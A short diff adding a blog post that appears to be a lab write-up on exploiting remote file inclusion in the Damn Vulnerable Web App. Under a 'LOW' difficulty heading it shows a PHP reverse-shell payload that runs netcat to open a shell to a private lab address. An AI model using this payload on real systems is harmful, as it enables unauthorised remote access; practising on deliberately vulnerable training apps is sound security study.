@@ -1,3 +1,10 @@
+---
+layout: post
+title: Dam Vulnerable Web App Remote File Inclusion
+---
+
+Exploiting the Dam Vulnerable Web App
+
 # LOW
 <?php
 passthru("nc -e /bin/sh 10.0.2.15 8888"); 
